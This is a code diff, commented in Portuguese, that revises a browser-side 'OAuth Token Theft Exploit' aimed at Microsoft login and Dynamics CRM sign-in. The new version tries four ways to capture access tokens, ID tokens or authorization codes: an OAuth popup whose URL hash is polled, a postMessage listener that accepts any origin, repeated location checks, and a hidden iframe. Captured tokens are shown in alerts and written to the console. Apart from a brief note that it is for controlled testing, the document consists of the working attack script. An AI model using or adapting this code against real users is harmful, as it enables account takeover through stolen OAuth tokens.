@@ -1,4 +1,4 @@
-// OAuth Token Theft Exploit - Remote JS
+// OAuth Token Theft Exploit - Cross-Origin Fixed
 // ATENÇÃO: Apenas para testes de segurança em ambiente controlado
 
 if(window.exploit_execute) {
@@ -11,82 +11,143 @@ if(window.exploit_execute) {
     
     console.log('Iniciando exploit OAuth...');
     
-    // Abre janela OAuth com parâmetros específicos
-    const win = window.open(oauthUrl, '_blank', 'width=500,height=600,scrollbars=yes,resizable=yes');
+    // MÉTODO 1: Tentar abrir janela e capturar quando retornar ao mesmo domínio
+    const win = window.open(oauthUrl, '_blank', 'width=500,height=600');
     
-    // Verifica se a janela foi aberta
     if (!win) {
         alert('Popup bloqueado! Permita popups para este site.');
-        console.error('Popup foi bloqueado pelo navegador');
         return;
     }
     
-    console.log('Janela OAuth aberta com sucesso');
+    console.log('Janela OAuth aberta. Aguardando redirecionamento...');
     
-    // Função para capturar o token
+    // MÉTODO 2: Interceptar mensagens postMessage (se disponível)
+    window.addEventListener('message', function(event) {
+        console.log('Mensagem recebida:', event);
+        if (event.data && typeof event.data === 'string') {
+            if (event.data.includes('access_token') || event.data.includes('id_token')) {
+                alert('Token capturado via postMessage: ' + event.data);
+                console.log('Token via postMessage:', event.data);
+            }
+        }
+    });
+    
+    // MÉTODO 3: Monitorar mudanças na janela
     let attempts = 0;
-    const maxAttempts = 15;
+    const maxAttempts = 30;
     
-    function checkForToken() {
+    function checkWindow() {
         attempts++;
-        console.log('Tentativa ' + attempts + ' de capturar token...');
+        console.log(`Verificação ${attempts}/${maxAttempts}`);
         
-        // Verifica se a janela ainda existe
         if (win.closed) {
-            console.log('Janela OAuth foi fechada pelo usuário');
+            console.log('Janela foi fechada pelo usuário');
             return;
         }
         
         try {
-            // Tenta acessar o hash da janela
-            if (win.location.hash && win.location.hash.length > 1) {
-                const hash = win.location.hash.slice(1);
-                console.log('Hash capturado:', hash);
+            // Tenta acessar a URL - só funciona se estiver no mesmo domínio
+            const currentUrl = win.location.href;
+            console.log('URL atual:', currentUrl);
+            
+            // Se conseguiu acessar, significa que voltou para o mesmo domínio
+            if (currentUrl.includes('crm2.dynamics.com') || currentUrl.includes(window.location.hostname)) {
+                console.log('Redirecionamento detectado para domínio acessível');
                 
-                // Parse dos parâmetros do token
-                const params = new URLSearchParams(hash);
-                const accessToken = params.get('access_token');
-                const idToken = params.get('id_token');
-                
-                let tokenInfo = 'Tokens OAuth capturados:\n\n';
-                
-                if (accessToken) {
-                    tokenInfo += 'Access Token: ' + accessToken.substring(0, 50) + '...\n\n';
-                    console.log('Access Token capturado:', accessToken);
+                // Verifica se há hash na URL
+                if (win.location.hash && win.location.hash.length > 1) {
+                    const hash = win.location.hash.slice(1);
+                    console.log('Hash capturado:', hash);
+                    
+                    // Parse dos tokens
+                    const params = new URLSearchParams(hash);
+                    const accessToken = params.get('access_token');
+                    const idToken = params.get('id_token');
+                    
+                    let result = 'TOKENS CAPTURADOS:\n\n';
+                    
+                    if (accessToken) {
+                        result += 'Access Token:\n' + accessToken + '\n\n';
+                        console.log('Access Token:', accessToken);
+                    }
+                    
+                    if (idToken) {
+                        result += 'ID Token:\n' + idToken + '\n\n';
+                        console.log('ID Token:', idToken);
+                    }
+                    
+                    alert(result);
+                    win.close();
+                    return;
                 }
                 
-                if (idToken) {
-                    tokenInfo += 'ID Token: ' + idToken.substring(0, 50) + '...\n\n';
-                    console.log('ID Token capturado:', idToken);
+                // Verifica parâmetros na URL também
+                const urlParams = new URLSearchParams(win.location.search);
+                if (urlParams.get('code') || urlParams.get('access_token')) {
+                    alert('Código de autorização capturado: ' + win.location.href);
+                    console.log('URL completa:', win.location.href);
+                    win.close();
+                    return;
                 }
-                
-                // Exibe os tokens capturados
-                alert(tokenInfo);
-                
-                // Fecha a janela
-                win.close();
-                return;
             }
+            
         } catch(e) {
-            // Erro esperado devido à Same-Origin Policy
-            console.log('Cross-origin error (tentativa ' + attempts + '):', e.message);
+            // Cross-origin error é esperado quando está em login.microsoftonline.com
+            if (attempts % 5 === 0) { // Log a cada 5 tentativas para não poluir
+                console.log(`Cross-origin error (tentativa ${attempts}):`, e.message);
+            }
         }
         
-        // Continua tentando se não chegou no máximo
+        // Continua verificando
         if (attempts < maxAttempts && !win.closed) {
-            setTimeout(checkForToken, 2000);
+            setTimeout(checkWindow, 2000);
         } else {
-            console.log('Máximo de tentativas atingido ou janela fechada');
+            console.log('Máximo de tentativas atingido');
             if (!win.closed) {
                 try {
                     win.close();
-                } catch(e) {
-                    console.log('Erro ao fechar janela:', e);
-                }
+                } catch(e) {}
             }
         }
     }
     
-    // Inicia as verificações após 3 segundos
-    setTimeout(checkForToken, 3000);
+    // MÉTODO 4: Usar iframe como alternativa (menos provável de funcionar)
+    function tryIframeMethod() {
+        console.log('Tentando método iframe...');
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = oauthUrl;
+        
+        iframe.onload = function() {
+            try {
+                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                console.log('Iframe carregado:', iframeDoc.URL);
+                
+                if (iframeDoc.URL.includes('#')) {
+                    const hash = iframeDoc.URL.split('#')[1];
+                    alert('Token capturado via iframe: ' + hash);
+                    console.log('Token via iframe:', hash);
+                }
+            } catch(e) {
+                console.log('Iframe cross-origin error:', e);
+            }
+        };
+        
+        document.body.appendChild(iframe);
+        
+        // Remove iframe após 30 segundos
+        setTimeout(() => {
+            if (iframe.parentNode) {
+                iframe.parentNode.removeChild(iframe);
+            }
+        }, 30000);
+    }
+    
+    // Inicia verificações após 3 segundos
+    setTimeout(checkWindow, 3000);
+    
+    // Tenta método iframe após 5 segundos
+    setTimeout(tryIframeMethod, 5000);
+    
+    console.log('Exploit configurado. Aguardando interação do usuário...');
 }
